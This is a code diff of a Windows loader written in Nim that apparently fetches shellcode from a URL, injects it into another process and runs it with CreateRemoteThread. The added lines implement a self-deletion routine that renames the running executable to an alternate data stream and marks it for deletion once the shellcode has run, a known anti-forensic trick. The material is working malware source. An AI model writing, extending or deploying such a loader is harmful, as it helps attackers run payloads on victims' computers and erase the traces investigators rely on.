@@ -2,6 +2,7 @@ import winim/[lean, winstr, utils]
 import std/strformat
 import std/[asyncdispatch, httpclient]
 import std/strutils
+import os
 
 proc getErrorMessage(): tuple[errCode: DWORD, errMsg: string] =
     let errCode = GetLastError()
@@ -10,7 +11,7 @@ proc getErrorMessage(): tuple[errCode: DWORD, errMsg: string] =
                    NULL,
                    errCode,
                    cast[DWORD](MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT)),
-                   pBuffer,
+                   &pBuffer,
                    cast[DWORD](pBuffer.len),
                    NULL);
     nullTerminate(pBuffer)
@@ -24,6 +25,61 @@ proc panic(msg: string, get_err = true) =
     else:
         echo(fmt"[!] {msg}")
     quit(QuitFailure)
+
+proc open_handle(pwPath: PWCHAR): HANDLE =
+    var handle = CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
+    if handle == INVALID_HANDLE_VALUE:
+        panic("CreateFileW")
+    return handle
+
+proc rename_handle(handle: HANDLE) =
+    var lpwStream = newWideCString(":void")
+    var stream_len = cast[DWORD]((lpwStream.len)*2)
+    var rename_size = cast[DWORD](sizeof(FILE_RENAME_INFO) + stream_len)
+    var byte_seq: seq[byte]
+    newSeq(byte_seq, rename_size)
+    var rename_info: PFILE_RENAME_INFO = cast[PFILE_RENAME_INFO](addr byte_seq[0])
+    RtlSecureZeroMemory(rename_info, rename_size)
+
+    rename_info.FileNameLength = stream_len
+    RtlCopyMemory(addr rename_info.FileName, addr lpwStream[0], stream_len)
+
+    var ret = SetFileInformationByHandle(handle, fileRenameInfo, rename_info, rename_size)
+    if ret == 0 :
+        panic("[rename_handle] SetFileInformationByHandle")
+
+proc disposition_handle(handle: HANDLE) =
+    var disposition_info: FILE_DISPOSITION_INFO
+    RtlSecureZeroMemory(addr disposition_info, sizeof(disposition_info))
+    disposition_info.DeleteFile = TRUE
+    var ret = SetFileInformationByHandle(handle, fileDispositionInfo, addr disposition_info, cast[DWORD](sizeof(disposition_info)))
+    if ret == 0 :
+        panic("[disposition_handle] SetFileInformationByHandle")
+
+
+proc selfDelete() =
+    var
+        filename: array[MAX_PATH+1, WCHAR]
+        hCurrentFile: HANDLE
+    RtlSecureZeroMemory(addr filename[0], sizeof(filename))
+    if GetModuleFileNameW(0, addr filename[0], MAX_PATH) == 0:
+        panic("GetModuleFileNameW")
+
+    hCurrentFile = open_handle(addr filename[0])
+    echo("[+] Attempting file renaming")
+    rename_handle(hCurrentFile)
+    echo("    Successfully renamed file")
+    CloseHandle(hCurrentFile)
+    
+    hCurrentFile = open_handle(addr filename[0])
+    echo("[+] Setting up delete disposition info")
+    disposition_handle(hCurrentFile)
+    CloseHandle(hCurrentFile)
+
+    if not fileExists(%$filename):
+        echo("[+] File deleted successfully")
+    else:
+        echo("[!] Fail to self delete")
 
 proc runnerCreateProcess(target: string, pi: LPPROCESS_INFORMATION, si: LPSTARTUPINFOW | LPSTARTUPINFOEXW, creationFlags: DWORD = 0) =
     let ret = CreateProcessW(NULL,
@@ -148,6 +204,9 @@ proc runner(url: string, target = "", parent = 0, kill = false) =
     var threadId: DWORD
     var hThread = CreateRemoteThread(hTarget, NULL, 0, cast[LPTHREAD_START_ROUTINE](baseAddress), NULL, 0, &threadId)
     echo("    Executing shellcode")
+
+    if kill:
+        selfDelete()
 
     if target == "":
         echo("[+] WaitForSingleObject")
